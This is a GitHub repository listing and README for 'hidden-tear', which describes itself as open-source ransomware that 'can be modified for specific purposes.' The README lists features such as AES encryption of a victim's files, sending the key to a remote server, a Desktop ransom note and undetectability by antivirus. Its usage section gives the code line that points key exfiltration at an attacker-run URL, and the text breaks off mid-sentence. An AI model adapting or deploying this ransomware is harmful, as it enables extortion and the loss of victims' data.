---
repo: "Bd-Mutant7/hidden-tear"
name: "hidden-tear"
description: "ransomware  open-sources"
readmeQualityOk: true
url: "https://github.com/Bd-Mutant7/hidden-tear"
language: "C#"
languages: ["C#"]
languagePcts: [100]
stars: 8
forks: 0
openIssues: 0
closedIssues: 0
watchers: 0
contributors: 1
recentReleases: 0
createdAt: "2026-03-18T07:41:47Z"
lastCommitAt: "2026-08-16T04:08:49Z"
status: "thriving"
tags: ["solo_builder"]
healthScore: 80
undervaluedScore: 44
maintainers: ["Bd-Mutant7"]
openGraphImageUrl: "https://opengraph.githubassets.com/5717f5f7e11e776f16292aecb6e2282c02d0be9af45f8ddcfdec3c9d871d2d0e/Bd-Mutant7/hidden-tear"
---

_     _     _     _              _                  
        | |   (_)   | |   | |            | |                 
        | |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
        | '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
        | | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
        |_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|   
                                                     
It's a ransomware-like file crypter sample which can be modified for specific purposes. 

**Features**
* Uses AES algorithm to encrypt files.
* Sends encryption key to a server.
* Encrypted files can be decrypt in decrypter program with encryption key.
* Creates a text file in Desktop with given message.
* Small file size (12 KB)
* Doesn't detected to antivirus programs (15/08/2015) http://nodistribute.com/result/6a4jDwi83Fzt

**Demonstration Video**

https://www.youtube.com/watch?v=LtiRISepIfs

**Usage**

* You need to have a web server which supports scripting languages like php,python etc. Change this line with your URL. (You better use Https connection to avoid eavesdropping)

  `string targetURL = "https://www.example.com/hidden-tear/write.php?info=";`

* The script…
